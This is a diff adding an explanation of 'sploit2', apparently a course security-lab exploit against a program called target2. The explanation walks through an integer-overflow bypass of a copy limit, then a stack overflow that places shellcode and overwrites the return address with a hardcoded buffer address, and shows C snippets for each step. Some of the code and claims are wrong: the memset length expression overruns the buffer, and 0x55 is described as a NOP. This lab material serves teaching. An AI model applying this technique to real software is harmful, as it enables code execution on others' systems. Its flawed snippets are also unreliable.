@@ -1,1 +1,40 @@
-Use this file to explain how your sploit2 works.
+This program has integer overflow vulnerability and we will use this
+vulnerability to bypass limitation of copying data on buf in target2. 
+
+Size of arg1 must be large enough to overflow and overwrite return address.
+Current size of it is MAX_WIDGETS*sizeof(struct widget)=268*32=8576;
+therefore, we choose 269*32=8608 as size of arg1.
+	
+	char arg1[8608];
+
+For copying arg1 into the buffer of foo function we must choose a negative
+number x which x*32=8608. We found that x can be -2147483379.
+
+	char *first = "-2147483379,";
+
+We copy this negative number (as count) at the begining of the arg1.
+
+	strcpy(arg1, first);
+
+Next, we copy our shellcode.
+
+	strcat(arg1, shellcode);
+
+Next, we fill rest of the arg1 with a non-null characters (here we use 0x55
+that is NOP or U)
+
+	memset(arg1+strlen(first)+strlen(shellcode),0x55,8608-strlen(first)+strlen(shellcode));
+
+At the end, we put the address of buf (which is the address of our shellcode)
+on address of arg1+8592. In this way, when arg1 will be copied on buf, 
+"return address" will be overwritten by address of our shellcode.
+
+	*(unsigned *)(&arg1[8592])=0xbeffba48;
+
+Finally, we run target2 with arg1 as its input.
+
+	char *args[] = { TARGET, arg1, NULL };
+	char *env[] = { NULL };
+
+	if (0 > execve(TARGET, args, env))
+		fprintf(stderr, "execve failed.\n");
